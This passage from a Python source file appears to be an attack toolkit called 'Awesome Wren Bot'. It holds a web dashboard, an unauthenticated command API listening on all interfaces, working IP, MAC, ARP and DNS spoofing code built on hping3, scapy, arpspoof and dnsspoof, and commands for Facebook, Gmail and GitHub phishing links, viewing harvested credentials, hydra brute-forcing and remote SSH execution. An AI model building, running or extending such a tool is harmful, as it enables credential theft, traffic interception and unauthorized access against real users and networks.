            color: #adffb9; border-left: 4px solid var(--primary);
        }
        .dashboard-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
            gap: 24px; margin-bottom: 28px;
        }
        .card {
            background: var(--card-bg); border-radius: 26px; padding: 18px 20px;
            border: 1px solid var(--border);
        }
        .card h3 { margin-bottom: 20px; color: var(--primary); }
        .quick-cmds { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 15px; }
        .quick-cmd {
            background: rgba(10,110,255,0.2); border: 1px solid var(--primary);
            border-radius: 20px; padding: 6px 12px; font-size: 0.7rem; cursor: pointer;
        }
        .quick-cmd:hover { background: var(--primary); color: #111; }
        canvas { max-height: 200px; width: 100%; }
        .footer-note { text-align: center; margin-top: 20px; font-size: 0.7rem; color: #5b6e8c; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #1e1f2c; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 8px; }
    </style>
</head>
<body class="theme-blue">
<div class="app-container">
    <div class="header">
        <div class="logo-area">
            <div class="wren-icon">🐦🤖</div>
            <div class="logo-text"><h1>AWESOME WREN BOT</h1></div>
        </div>
        <div class="theme-panel">
            <div class="theme-btn blue" data-theme="blue"></div>
            <div class="theme-btn orange" data-theme="orange"></div>
            <div class="theme-btn purple" data-theme="purple"></div>
            <div class="theme-btn green" data-theme="green"></div>
        </div>
    </div>

    <div class="terminal-card">
        <div class="quick-cmds">
            <span class="quick-cmd" onclick="setCommand('help')">help</span>
            <span class="quick-cmd" onclick="setCommand('status')">status</span>
            <span class="quick-cmd" onclick="setCommand('time')">time</span>
            <span class="quick-cmd" onclick="setCommand('ping 8.8.8.8')">ping 8.8.8.8</span>
            <span class="quick-cmd" onclick="setCommand('scan 127.0.0.1')">scan 127.0.0.1</span>
            <span class="quick-cmd" onclick="setCommand('whois google.com')">whois google.com</span>
            <span class="quick-cmd" onclick="setCommand('traffic_types')">traffic_types</span>
            <span class="quick-cmd" onclick="setCommand('generate_phishing_link_for_facebook')">phish_fb</span>
        </div>
        <div class="cmd-input-group">
            <input type="text" id="commandInput" placeholder="Enter cyber command..." autocomplete="off">
            <button class="btn-exec" id="execCmdBtn"><i class="fas fa-bolt"></i> EXECUTE</button>
        </div>
        <div class="output-area" id="terminalOutput">
            > 🐦 AWESOME WREN BOT ACTIVE v1.0<br>
            > Ready for cybersecurity commands.<br>
            > Type 'help' for full command list.
        </div>
    </div>

    <div class="dashboard-grid">
        <div class="card">
            <h3><i class="fas fa-chart-simple"></i> Port Scan Analytics</h3>
            <canvas id="barChart" width="300" height="180"></canvas>
            <div id="liveStats" style="margin-top: 10px;"></div>
        </div>
        <div class="card">
            <h3><i class="fas fa-qrcode"></i> QR Code Generator</h3>
            <input type="text" id="qrUrlInput" placeholder="Enter URL for QR code" style="width: 100%; padding: 10px; border-radius: 8px; background: #0a0c14; border: 1px solid var(--border); color: #fff;">
            <button id="generateQrBtn" class="btn-exec" style="margin-top: 10px; width: 100%;"><i class="fas fa-qrcode"></i> Generate QR Code</button>
            <div id="qrResult" style="margin-top: 15px; text-align: center;"></div>
        </div>
    </div>
    
    <div class="footer-note">
        <i class="fas fa-robot"></i> AWESOME WREN BOT — Multi-Platform Cybersecurity Command Center<br>
        Discord | Telegram | WhatsApp | Slack | Signal | iMessage | Google Chat | Web Interface<br>
        5000+ Security Commands | SSH | Nmap | Nikto | Traffic Generation | Phishing | Spoofing
    </div>
</div>

<script>
    let barChart;
    const themeBtns = document.querySelectorAll('.theme-btn');
    function setTheme(theme) {
        document.body.className = '';
        document.body.classList.add(`theme-${theme}`);
        themeBtns.forEach(btn => {
            if (btn.dataset.theme === theme) btn.classList.add('active');
            else btn.classList.remove('active');
        });
    }
    themeBtns.forEach(btn => {
        btn.addEventListener('click', () => setTheme(btn.dataset.theme));
    });
    setTheme('blue');

    const terminalDiv = document.getElementById('terminalOutput');
    const commandInput = document.getElementById('commandInput');
    
    function addToTerminal(text) {
        const p = document.createElement('div');
        p.innerHTML = `> ${text}`;
        terminalDiv.appendChild(p);
        terminalDiv.scrollTop = terminalDiv.scrollHeight;
    }

    function setCommand(cmd) {
        commandInput.value = cmd;
        commandInput.focus();
    }

    async function executeCommand() {
        const cmd = commandInput.value.trim();
        if (!cmd) return;
        addToTerminal(`$ ${cmd}`);
        commandInput.value = '';
        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            });
            const data = await response.json();
            addToTerminal(data.output || (data.success ? 'Command executed' : 'Command failed'));
            addToTerminal(`[Time: ${(data.execution_time || 0).toFixed(2)}s]`);
            loadStats();
        } catch (err) {
            addToTerminal(`Error: ${err.message}`);
        }
    }

    async function loadStats() {
        try {
            const response = await fetch('/api/stats');
            const stats = await response.json();
            document.getElementById('liveStats').innerHTML = `Total Commands: ${stats.total_commands || 0} | Threats: ${stats.total_threats || 0} | Phishing: ${stats.total_phishing_links || 0}`;
            if (barChart) {
                barChart.data.datasets[0].data = [stats.total_commands || 0, stats.total_threats || 0, stats.total_phishing_links || 0];
                barChart.update();
            }
        } catch(e) {}
    }

    document.getElementById('generateQrBtn').addEventListener('click', async () => {
        const url = document.getElementById('qrUrlInput').value.trim();
        if (!url) { addToTerminal('[!] Please enter a URL'); return; }
        try {
            const response = await fetch('/api/generate_qr', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ url: url })
            });
            const data = await response.json();
            if (data.success && data.qr_data) {
                document.getElementById('qrResult').innerHTML = `<img src="${data.qr_data}" style="max-width: 200px; border-radius: 10px;"><br><small>${data.url}</small>`;
                addToTerminal(`[QR] QR Code generated for: ${data.url}`);
            } else { addToTerminal(`[ERROR] ${data.error}`); }
        } catch(err) { addToTerminal(`[ERROR] ${err.message}`); }
    });

    document.getElementById('execCmdBtn').addEventListener('click', executeCommand);
    commandInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') executeCommand(); });

    const ctx = document.getElementById('barChart').getContext('2d');
    barChart = new Chart(ctx, {
        type: 'bar',
        data: { labels: ['Commands', 'Threats', 'Phishing'], datasets: [{ label: 'Count', data: [0, 0, 0], backgroundColor: '#0a6eff', borderRadius: 8 }] },
        options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: '#ccc' } } } }
    });
    loadStats();
    setInterval(loadStats, 10000);
    addToTerminal('🎯 Awesome Wren Bot ready. Use commands like nmap, whois, ping, traffic, phishing, ssh, spoof_ip, nikto');
</script>
</body>
</html>
"""

class WebRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(WEB_HTML.encode('utf-8'))
        elif self.path == '/api/stats':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            stats = self.server_instance.db.get_statistics() if self.server_instance else {}
            self.wfile.write(json.dumps(stats).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/command':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                command = data.get('command', '')
                if self.server_instance and self.server_instance.handler:
                    result = self.server_instance.handler.execute(command, 'web', 'web_user')
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps(result).encode('utf-8'))
                else:
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'output': 'Server not ready'}).encode('utf-8'))
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'output': str(e)}).encode('utf-8'))
        elif self.path == '/api/generate_qr':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                url = data.get('url', '')
                if url and QRCODE_AVAILABLE:
                    qr = qrcode.QRCode(version=1, box_size=10, border=5)
                    qr.add_data(url)
                    qr.make(fit=True)
                    img = qr.make_image(fill_color="black", back_color="white")
                    import io
                    import base64
                    buffer = io.BytesIO()
                    img.save(buffer, format='PNG')
                    qr_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True, 'qr_data': f'data:image/png;base64,{qr_base64}', 'url': url}).encode('utf-8'))
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'error': 'URL required'}).encode('utf-8'))
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

class WebServer:
    def __init__(self, handler, db: DatabaseManager, port: int = 8080):
        self.handler = handler
        self.db = db
        self.port = port
        self.server = None
        self.running = False
    
    def start(self):
        try:
            WebRequestHandler.server_instance = self
            self.server = HTTPServer(("0.0.0.0", self.port), WebRequestHandler)
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web server started on http://0.0.0.0:{self.port}{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start web server: {e}{Colors.RESET}")
            return False
    
    def _run(self):
        try:
            self.server.serve_forever()
        except Exception as e:
            logger.error(f"Web server error: {e}")
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False

# =====================
# SPOOFING ENGINE
# =====================
class SpoofingEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.running_spoofs = {}
    
    def spoof_ip(self, original_ip: str, spoofed_ip: str, target: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"IP Spoofing: {original_ip} -> {spoofed_ip}", 'output': '', 'method': ''}
        
        if shutil.which('hping3'):
            try:
                exec_result = subprocess.run(['hping3', '-S', '-a', spoofed_ip, '-p', '80', target], 
                                           capture_output=True, timeout=5)
                if exec_result.returncode == 0:
                    result.update({'success': True, 'output': "IP spoofing using hping3", 'method': 'hping3'})
                    self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                    return result
            except:
                pass
        
        if self.scapy_available:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(src=spoofed_ip, dst=target)/TCP(dport=80)
                send(packet, verbose=False)
                result.update({'success': True, 'output': f"IP spoofing using Scapy: Sent packet from {spoofed_ip} to {target}", 'method': 'scapy'})
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy failed: {e}"
        
        result['output'] = "IP spoofing failed. Install hping3 or scapy."
        self.db.log_spoofing('ip', original_ip, spoofed_ip, target, False)
        return result
    
    def spoof_mac(self, interface: str, new_mac: str) -> Dict[str, Any]:
        result = {'success': False, 'command': f"MAC Spoofing on {interface}: -> {new_mac}", 'output': '', 'method': ''}
        
        if shutil.which('macchanger'):
            try:
                subprocess.run(['ip', 'link', 'set', interface, 'down'], timeout=5)
                mac_result = subprocess.run(['macchanger', '--mac', new_mac, interface], 
                                          capture_output=True, text=True, timeout=10)
                subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=5)
                if mac_result.returncode == 0:
                    result.update({'success': True, 'output': mac_result.stdout, 'method': 'macchanger'})
                    self.db.log_spoofing('mac', interface, new_mac, interface, True)
                    return result
            except Exception as e:
                result['output'] = f"macchanger failed: {e}"
        
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'], timeout=5)
            cmd_result = subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                                      capture_output=True, text=True, timeout=5)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=5)
            if cmd_result.returncode == 0:
                result.update({'success': True, 'output': f"MAC changed to {new_mac}", 'method': 'ip'})
                self.db.log_spoofing('mac', interface, new_mac, interface, True)
                return result
        except Exception as e:
            result['output'] = f"ip method failed: {e}"
        
        result['output'] = "MAC spoofing failed. Install macchanger or ensure root."
        self.db.log_spoofing('mac', interface, new_mac, interface, False)
        return result
    
    def arp_spoof(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"ARP Spoofing: {target_ip} -> {spoof_ip}", 'output': '', 'method': ''}
        
        if shutil.which('arpspoof'):
            try:
                cmd = ['arpspoof', '-i', interface, '-t', target_ip, spoof_ip]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"arp_{target_ip}"] = process
                result.update({'success': True, 'output': f"ARP spoofing started: {target_ip} -> {spoof_ip}", 'method': 'arpspoof'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"arpspoof failed: {e}"
        
        if self.scapy_available:
            try:
                from scapy.all import Ether, ARP, sendp
                local_mac = self._get_local_mac(interface)
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
                sendp(packet, iface=interface, verbose=False)
                result.update({'success': True, 'output': f"ARP spoofing using Scapy", 'method': 'scapy'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy ARP failed: {e}"
        
        result['output'] = "ARP spoofing failed. Install dsniff (arpspoof) or scapy."
        self.db.log_spoofing('arp', target_ip, spoof_ip, interface, False)
        return result
    
    def dns_spoof(self, domain: str, fake_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"DNS Spoofing: {domain} -> {fake_ip}", 'output': '', 'method': ''}
        
        if shutil.which('dnsspoof'):
            try:
                hosts_file = "/tmp/dnsspoof.txt"
                with open(hosts_file, 'w') as f:
                    f.write(f"{fake_ip} {domain}\n{fake_ip} www.{domain}\n")
                cmd = ['dnsspoof', '-i', interface, '-f', hosts_file]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns_{domain}"] = process
                result.update({'success': True, 'output': f"DNS spoofing started: {domain} -> {fake_ip}", 'method': 'dnsspoof'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnsspoof failed: {e}"
        
        if self.scapy_available:
            try:
                from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send
                dns_response = IP(dst="0.0.0.0")/UDP(sport=53, dport=53)/DNS(id=0x1234, qr=1, aa=1, qd=DNSQR(qname=domain), an=DNSRR(rrname=domain, rdata=fake_ip))
                send(dns_response, verbose=False)
                result.update({'success': True, 'output': f"DNS spoofing using Scapy", 'method': 'scapy'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy DNS failed: {e}"
        
        result['output'] = "DNS spoofing failed. Install dnsspoof or scapy."
        self.db.log_spoofing('dns', domain, fake_ip, interface, False)
        return result
    
    def _get_local_mac(self, interface: str) -> str:
        try:
            result = subprocess.run(['cat', f'/sys/class/net/{interface}/address'], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        return "00:11:22:33:44:55"
    
    def stop_spoofing(self, spoof_id: str = None) -> Dict[str, Any]:
        if spoof_id and spoof_id in self.running_spoofs:
            try:
                self.running_spoofs[spoof_id].terminate()
                del self.running_spoofs[spoof_id]
                return {'success': True, 'output': f"Stopped spoofing: {spoof_id}"}
            except:
                pass
        for spoof_id, process in list(self.running_spoofs.items()):
            try:
                process.terminate()
            except:
                pass
        self.running_spoofs.clear()
        return {'success': True, 'output': "Stopped all spoofing processes"}

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 nikto_scanner: NiktoScanner = None,
                 traffic_generator: TrafficGeneratorEngine = None,
                 spoof_engine: SpoofingEngine = None,
                 social_tools: SocialEngineeringTools = None,
                 wordlist_manager: WordlistManager = None):
        self.db = db
        self.ssh = ssh_manager
        self.nikto = nikto_scanner
        self.traffic_gen = traffic_generator
        self.spoof_engine = spoof_engine
        self.social_tools = social_tools
        self.wordlist_manager = wordlist_manager
        self.tools = NetworkTools()
        self.command_map = self._setup_command_map()
    
    def _setup_command_map(self) -> Dict[str, callable]:
        return {
            'time': lambda args: {'success': True, 'output': f"🕐 {datetime.datetime.now().strftime('%H:%M:%S')}"},
            'date': lambda args: {'success': True, 'output': f"📅 {datetime.datetime.now().strftime('%A, %B %d, %Y')}"},
            'datetime': lambda args: {'success': True, 'output': f"📅 {datetime.datetime.now().strftime('%A, %B %d, %Y')}\n🕐 {datetime.datetime.now().strftime('%H:%M:%S')}"},
            'history': self._execute_history,
            'time_history': self._execute_time_history,
            'ssh_add': self._execute_ssh_add,
            'ssh_list': self._execute_ssh_list,
            'ssh_connect': self._execute_ssh_connect,
            'ssh_exec': self._execute_ssh_exec,
            'ssh_disconnect': self._execute_ssh_disconnect,
            'spoof_ip': self._execute_spoof_ip,
            'spoof_mac': self._execute_spoof_mac,
            'arp_spoof': self._execute_arp_spoof,
            'dns_spoof': self._execute_dns_spoof,
            'stop_spoof': self._execute_stop_spoof,
            'ping': self._execute_ping,
            'scan': self._execute_scan,
            'quick_scan': self._execute_quick_scan,
            'full_scan': self._execute_full_scan,
            'nmap': self._execute_nmap,
            'traceroute': self._execute_traceroute,
            'whois': self._execute_whois,
            'dns': self._execute_dns,
            'location': self._execute_location,
            'curl': self._execute_curl,
            'wget': self._execute_wget,
            'nc': self._execute_nc,
            'hydra': self._execute_hydra,
            'wordlist_stats': self._execute_wordlist_stats,
            'nikto': self._execute_nikto,
            'nikto_full': self._execute_nikto_full,
            'nikto_ssl': self._execute_nikto_ssl,
            'nikto_sql': self._execute_nikto_sql,
            'nikto_xss': self._execute_nikto_xss,
            'nikto_cgi': self._execute_nikto_cgi,
            'generate_traffic': self._execute_generate_traffic,
            'traffic_types': self._execute_traffic_types,
            'traffic_status': self._execute_traffic_status,
            'traffic_stop': self._execute_traffic_stop,
            'traffic_logs': self._execute_traffic_logs,
            'generate_phishing_link_for_facebook': lambda args: self._execute_phishing(args, 'facebook'),
            'generate_phishing_link_for_instagram': lambda args: self._execute_phishing(args, 'instagram'),
            'generate_phishing_link_for_twitter': lambda args: self._execute_phishing(args, 'twitter'),
            'generate_phishing_link_for_gmail': lambda args: self._execute_phishing(args, 'gmail'),
            'generate_phishing_link_for_linkedin': lambda args: self._execute_phishing(args, 'linkedin'),
            'generate_phishing_link_for_github': lambda args: self._execute_phishing(args, 'github'),
            'generate_phishing_link_for_custom': self._execute_phishing_custom,
            'phishing_start_server': self._execute_phishing_start,
            'phishing_stop_server': self._execute_phishing_stop,
            'phishing_status': self._execute_phishing_status,
            'phishing_links': self._execute_phishing_links,
            'phishing_credentials': self._execute_phishing_credentials,
            'phishing_qr': self._execute_phishing_qr,
            'phishing_shorten': self._execute_phishing_shorten,
            'api_create_key': self._execute_api_create_key,
            'api_list_keys': self._execute_api_list_keys,
            'clear': lambda args: os.system('cls' if os.name == 'nt' else 'clear') or {'success': True, 'output': ''},
            'help': self._execute_help,
            'status': self._execute_status,
            'threats': self._execute_threats,
            'report': self._execute_report,
            'exit': lambda args: {'success': True, 'output': 'exit'}
        }
    
    def execute(self, command: str, source: str = "local", sender: str = None) -> Dict:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.command_map:
            try:
                result = self.command_map[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}"}
        else:
            result = self._execute_generic(command)
        
        execution_time = time.time() - start_time
        self.db.log_command(command, source, source, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        result['execution_time'] = execution_time
        return result
    
    # ==================== Command Implementations ====================
    def _execute_history(self, args):
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.get_command_history(limit)
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n" + "\n".join([f"{h['timestamp'][:19]} - {h['command'][:50]}" for h in history])
        return {'success': True, 'output': output}
    
    def _execute_time_history(self, args):
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.get_time_history(limit)
        if not history:
            return {'success': True, 'output': 'No time command history'}
        output = "⏰ Time Command History:\n" + "\n".join([f"{h['timestamp'][:19]} - {h['command']}" for h in history])
        return {'success': True, 'output': output}
    
    def _execute_ssh_add(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password] [port]'}
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        port = int(args[4]) if len(args) > 4 and args[4].isdigit() else 22
        result = self.ssh.add_server(name, host, username, password, None, port)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _execute_ssh_list(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        servers = self.ssh.get_servers()
        if not servers:
            return {'success': True, 'output': 'No SSH servers configured'}
        output = "🔌 SSH Servers:\n"
        for s in servers:
            status = "🟢" if s.get('connected') else "⚪"
            output += f"{status} {s['name']} - {s['host']}:{s['port']} ({s['username']})\n"
        return {'success': True, 'output': output}
    
    def _execute_ssh_connect(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <server_id>'}
        result = self.ssh.connect(args[0])
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _execute_ssh_exec(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <server_id> <command>'}
        server_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(server_id, command)
        if result.success:
            return {'success': True, 'output': result.output or 'Command executed successfully'}
        return {'success': False, 'output': result.error or 'Command failed'}
    
    def _execute_ssh_disconnect(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        server_id = args[0] if args else None
        self.ssh.disconnect(server_id)
        return {'success': True, 'output': 'Disconnected' + (f' from {server_id}' if server_id else ' from all')}
    
    def _execute_spoof_ip(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: spoof_ip <original_ip> <spoofed_ip> <target> [interface]'}
        result = self.spoof_engine.spoof_ip(args[0], args[1], args[2], args[3] if len(args) > 3 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_spoof_mac(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_mac <interface> <new_mac>'}
        result = self.spoof_engine.spoof_mac(args[0], args[1])
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_arp_spoof(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <spoof_ip> [interface]'}
        result = self.spoof_engine.arp_spoof(args[0], args[1], args[2] if len(args) > 2 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_dns_spoof(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dns_spoof <domain> <fake_ip> [interface]'}
        result = self.spoof_engine.dns_spoof(args[0], args[1], args[2] if len(args) > 2 else "eth0")
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_stop_spoof(self, args):
        if not self.spoof_engine:
            return {'success': False, 'output': 'Spoofing engine not initialized'}
        result = self.spoof_engine.stop_spoofing(args[0] if args else None)
        return {'success': result['success'], 'output': result['output']}
    
    def _execute_ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        result = self.tools.ping(args[0])
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [ports]'}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.tools.nmap_scan(target, ports)
        if result['success']:
            open_ports, closed_ports = self.tools.analyze_ports(result['output'])
            scan_id = str(uuid.uuid4())[:8]
            scan_result = ScanResult(
                id=scan_id, target=target, scan_type='standard',
                open_ports=open_ports, closed_ports=closed_ports,
                timestamp=datetime.datetime.now().isoformat(), scan_time=result.get('execution_time', 0)
            )
            self.db.save_scan_result(scan_result)
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _execute_quick_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, "1-1000", "quick")
        return {'success': result['success'], 'output': result['output'][:800]}
    
    def _execute_full_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, "", "full")
        return {'success': result['success'], 'output': result['output'][:1500]}
    
    def _execute_nmap(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        result = self.tools.nmap_scan(target, options)
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _execute_traceroute(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.tools.traceroute(args[0])
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_whois(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.tools.whois_lookup(args[0])
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _execute_dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain>'}
        result = self.tools.dig(args[0])
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_location(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.get_ip_location(args[0])
        if result.get('success'):
            return {'success': True, 'output': f"📍 Location: {result.get('country')}, {result.get('city')}\nISP: {result.get('isp')}"}
        return {'success': False, 'output': result.get('error', 'Location lookup failed')}
    
    def _execute_curl(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl <url> [method] [data]'}
        url = args[0]
        method = args[1].upper() if len(args) > 1 else "GET"
        data = args[2] if len(args) > 2 else None
        result = self.tools.curl(url, method, data)
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _execute_wget(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [output]'}
        url = args[0]
        output = args[1] if len(args) > 1 else None
        result = self.tools.wget(url, output)
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_nc(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc <host> <port> [data]'}
        host = args[0]
        try:
            port = int(args[1])
        except:
            return {'success': False, 'output': f'Invalid port: {args[1]}'}
        data = args[2] if len(args) > 2 else None
        result = self.tools.nc(host, port, data)
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _execute_hydra(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: hydra <target> <service> [options]'}
        target = args[0]
        service = args[1]
        options = ' '.join(args[2:]) if len(args) > 2 else ''
        result = self.tools.hydra(target, service, password_list=options if '-P' in options else None)
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _execute_wordlist_stats(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wordlist_stats <wordlist_id>'}
        wordlist_id = args[0]
        stats = self.wordlist_manager.analyze_wordlist(wordlist_id) if self.wordlist_manager else None
        if not stats:
            return {'success': False, 'output': 'Wordlist not found'}
        output = f"📊 Wordlist Analysis:\nTotal Words: {stats.get('total_words', 0)}\nUnique: {stats.get('unique_words', 0)}\nAvg Length: {stats.get('avg_length', 0)}"
        return {'success': True, 'output': output}
    
    def _execute_nikto(self, args):
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        result = self.nikto.scan(target)
        if result['success']:
            output = f"🕷️ Nikto Scan Results for {target}\nVulnerabilities Found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:10]:
                output += f"  • {v['description'][:100]}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f'Scan failed: {result.get("error", "Unknown error")}'}
    
    def _execute_nikto_full(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        return self._execute_nikto(args)
    
    def _execute_nikto_ssl(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'ssl': True})
        return {'success': result['success'], 'output': result.get('output', 'SSL scan completed')[:1000]}
    
    def _execute_nikto_sql(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_sql <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'tuning': '4'})
        return {'success': result['success'], 'output': result.get('output', 'SQL scan completed')[:1000]}
    
    def _execute_nikto_xss(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_xss <target>'}
        target = args[0]
